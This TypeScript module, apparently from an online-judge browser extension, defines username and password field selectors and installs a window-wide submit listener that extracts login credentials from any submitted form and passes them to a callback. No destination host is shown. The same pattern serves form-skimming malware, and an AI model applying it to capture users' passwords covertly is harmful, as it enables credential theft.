import type { OjCredentialCapturePayload } from './captureTypes'

export const CAPTURE_USERNAME_SELECTORS = [
  'input[autocomplete="username"]',
  'input[name="username"]',
  'input[name="userName"]',
  'input[name="email"]',
  'input[type="email"]',
  'input[name="handleOrEmail"]',
] as const

export const CAPTURE_PASSWORD_SELECTORS = [
  'input[autocomplete="current-password"]',
  'input[type="password"]',
  'input[name="password"]',
] as const

export function extractCredentialCapture(form: Pick<HTMLFormElement, 'querySelector'>): OjCredentialCapturePayload | null {
  const password = findValue(form, CAPTURE_PASSWORD_SELECTORS)
  const username = findValue(form, CAPTURE_USERNAME_SELECTORS)
  if (!username || !password) return null
  return { username, password }
}

export function installCredentialCaptureListener(
  windowLike: Pick<Window, 'addEventListener' | 'removeEventListener'>,
  _documentLike: Pick<Document, 'querySelector'>,
  send: (payload: OjCredentialCapturePayload) => void,
): () => void {
  const onSubmit = (event: Event): void => {
    const target = event.target
    if (!target || typeof target !== 'object' || !('tagName' in target) || target.tagName !== 'FORM') return
    const payload = extractCredentialCapture(target as HTMLFormElement)
    if (payload) send(payload)
  }
  windowLike.addEventListener('submit', onSubmit, true)
  return () => windowLike.removeEventListener('submit', onSubmit, true)
}

function findValue(
  form: Pick<HTMLFormElement, 'querySelector'>,
  selectors: readonly string[],
): string | null {
  for (const selector of selectors) {
    try {
      const field = form.querySelector(selector) as HTMLInputElement | null
      if (!field || field.disabled || field.readOnly || field.type === 'hidden') continue
      const value = field.value.trim()
      if (value.length > 0) return value
    } catch {
      // Invalid selectors are ignored; the page must continue its normal login flow.
    }
  }
  return null
}
